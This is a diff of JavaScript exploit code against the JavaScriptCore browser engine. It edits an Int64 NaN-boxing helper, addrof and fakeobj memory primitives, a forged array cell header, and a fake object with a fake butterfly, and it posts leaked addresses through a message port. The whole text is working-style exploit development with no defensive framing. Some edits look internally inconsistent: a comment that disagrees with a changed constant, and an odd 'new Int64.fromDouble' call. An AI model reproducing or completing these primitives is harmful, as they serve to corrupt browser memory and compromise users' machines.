@@ -157,9 +157,9 @@ function Int64(v) {
             throw new RangeError("Integer can not be represented by a JSValue");
 
         // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
-        this.assignSub(this, 0x1000000000000);
+        this.assignSub(this, 0x2000000000000);
         var res = Struct.unpack(Struct.float64, bytes);
-        this.assignAdd(this, 0x1000000000000);
+        this.assignAdd(this, 0x2000000000000);
 
         return res;
     };
@@ -393,7 +393,7 @@ var qwordAsFloat = qword => {
             return d - kBoxedDoubleOffset;
           }
           // the structure ID is wrong, but we'll fix it :)
-          let doubleArrayCellHeader = 0x0108230700000000n;
+          let doubleArrayCellHeader = new Int64(0x0108230700000000).asJSValue();
           let f = new Float64Array(1);
           let u = new Uint32Array(f.buffer);
           function float2bigint(v,set) {
@@ -458,18 +458,18 @@ var qwordAsFloat = qword => {
             // temporary implementations
             addrof = (val) => {
               b1[0] = val;
-              return parseInt(float2bigint(a1[offset],true),16);
+              return new Int64.fromDouble(a1[offset]);
             }
             fakeobj = (addr) => {
-              a1[offset] = bigint2float(addr);
+              a1[offset] = new Int64(addr).asDouble();
               return b1[0];
             }
             let obj = {
-              jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
+              jsCellHeader: doubleArrayCellHeader,
               fakeButterfly: a0
             };
             let addr = addrof(obj);
-            port.postMessage("obj @ " + dec2hex(addr.toString()));
+            port.postMessage("obj @ " + addr.toString());
             port.postMessage(typeof(addr) +"vs"+typeof(0x10))
            
             let fakeArr = fakeobj(addr + 0x10); //no way around this im forced to use bigint for fakeobj :(
